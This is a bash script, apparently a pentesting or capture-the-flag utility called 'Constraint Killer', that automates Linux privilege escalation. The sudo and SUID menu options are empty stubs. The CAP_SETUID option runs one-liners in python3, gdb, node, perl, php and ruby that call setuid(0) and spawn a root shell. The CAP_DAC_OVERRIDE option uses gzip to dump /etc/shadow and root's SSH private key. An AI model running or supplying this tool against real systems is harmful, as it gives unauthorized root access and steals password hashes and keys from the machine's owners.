#!/bin/bash
cat << 'EOF'                                                  
                            .,:                   
                        .l0WMMMd                  
                       xMMMMMMMW                  
      ....           l:..cOWMWWW       '::       
     cMMMMMMMMMMM0. 0MMMKo  ....   ,xXMMMM'      
    xMMMMMMMMMMMO .XMMMMN, cXMMMNd .WMMMMMd      
   OMMMMMMMMMMMo ;WMMMMN. KMMMMMMMd ;0MMMMd      
   .;oONMMMMMM: oMMMMMM, 0MMMMMMMM, :. ;xX'      
        .;oOX' kMMMMMMN 'MMMMMMMW: oMMNx;        
             .KMMMMMMMN ,MMMMMWd..OMMMMMl        
             cXMMMMMMMM: l00d; .xWMMMMW, :       
              ..:kNMMMM0 .;;cxXMMMMMMN. OMK.     
           ,xNMXd, .l0x ,WMMMMMMMMMMK..XMMMW;    
         .KMMMMMMMN     dXMMMMMMMMMk 'NMMMMMMo   
        ;, 'oKMMMMX      ..cOWMMMMl :MMMMMMMMM0  
       dMl .c .:kN;   c0MMKo' 'oK;  xWMMMMMMMMMx 
      0W; ;WO  o'   ,NMMMMMMMo        :OMMMMMMd  
    .XN. oMo .XX.  :. ,dXMMMMc          .lXMMc   
   ,W0  kW: ,W0  .0W, ;: .cON              .'    
  cMx .KN' cMx  .NX. oMo .o.                      
 .Ml ,NK. dMl  ,WO  xM: ,W0                       
 ., cMk  OW,  lMd  0W' :Mx          Just Elevate These Privileges Already ! Constraint Killer              
   ,kc  ok.  ,kc  dk. .kl                              

████████████████████████████████████████████████████████████████████████████████████████████████████████

       █████ ██████████ ███████████ ███████████    █████████     █████████  █████   ████    ███ ███ ███
      ░░███ ░░███░░░░░█░█░░░███░░░█░░███░░░░░███  ███░░░░░███   ███░░░░░███░░███   ███░    ░███░███░███
       ░███  ░███  █ ░ ░   ░███  ░  ░███    ░███ ░███    ░███  ███     ░░░  ░███  ███      ░███░███░███
       ░███  ░██████       ░███     ░██████████  ░███████████ ░███          ░███████       ░███░███░███
       ░███  ░███░░█       ░███     ░███░░░░░░   ░███░░░░░███ ░███          ░███░░███      ░███░███░███
 ███   ░███  ░███ ░   █    ░███     ░███         ░███    ░███ ░░███     ███ ░███ ░░███     ░░░ ░░░ ░░░ 
░░████████   ██████████    █████    █████        █████   █████ ░░█████████  █████ ░░████    ███ ███ ███
 ░░░░░░░░   ░░░░░░░░░░    ░░░░░    ░░░░░        ░░░░░   ░░░░░   ░░░░░░░░░  ░░░░░   ░░░░    ░░░ ░░░ ░░░ 
EOF
echo " "
echo "████████████████████████████████████████████████████████████████████████████████████████████████████████"
echo " "

while true; do
    echo "Categories : "
    echo " "
    echo "1) Sudo Right"
    echo "2) SUID"
    echo "3) Capabilities (CAP_SETUID)"
    echo "4) Capabilities (CAP_DAC_OVERRIDE)"
    echo "5) Quit"
    echo " "    
    read -p "Vulnerability Choice : " choix

    case "$choix" in
        1)
            echo "Sudo Rights : "
            break
            ;;
        2)
            echo "SUID : "
            break
            ;;
        3)
            echo "Capabilities (CAP_SETUID) : "
            result=$(getcap -r / 2>/dev/null | grep setuid | awk -F' = ' '{print $1}' | awk '{print $1}')

            if [ -z "$result" ]; then
                echo "No CAP_SETUID Binaries Detected"
                continue
            else
                echo "Vulnerables Binaries :"
                echo "$result"
            fi
            
            select choice in $result; do
                case "$choice" in
                    *python3*)
                        echo "Trying with python3"
                        "$choice" -c 'import os; os.setuid(0); os.system("bash")'
                        ;;
                    *gdb*)
                        echo "Trying with gdb"
                        "$choice" -nx -ex 'python import os; os.setuid(0)' -ex '!/bin/sh' -ex quit
                        ;;
                    *node*)
                        echo "Trying with node"
                        "$choice" -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
                        ;;
                    *perl*)
                        echo "Trying with perl"
                        "$choice" -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh"'
                        ;;
                    *php*)
                        echo "Trying with php"
                        "$choice" -r 'posix_setuid(0); system("/bin/sh -i");'
                        ;;
                    *ruby*)
                        echo "Trying with ruby"
                        "$choice" -e 'Process::Sys.setuid(0); exec "/bin/sh"'
                        ;;
                    *)
                        echo "Invalid Choice, Choose From : "
                        printf '%s\n' "$result" | nl -w2 -s') '
                        ;;
                esac
            done                
                
            break
            ;;
        4)
            echo "Capabilities (CAP_DAC_OVERRIDE) : "
            result=$(getcap -r / 2>/dev/null | grep dac_override | awk -F' = ' '{print $1}' | awk '{print $1}')

            if [ -z "$result" ]; then
                echo "No CAP_DAC_OVERRIDE Binaries Detected"
                continue
            else
                echo "Vulnerables Binaries :"
                echo "$result"
            fi
            
            select choice in $result; do
                case "$choice" in
                    *gzip*)
                        echo "Trying to Harvest Critical Data with gzip"
                        "$choice" -c /etc/shadow | gzip -d
                        "$choice" -c /root/.ssh/id_rsa | gzip -d
                        exit 0
                        ;;
                    *)
                        echo "Choix invalide"
                        printf '%s\n' "$result" | nl -w2 -s') '
                        ;;
                esac
            done 
            
            break
            ;;
        5)
            exit 0
            break
            ;;
        *)
            echo "Invalid Choice, Restart"
            ;;
    esac
done
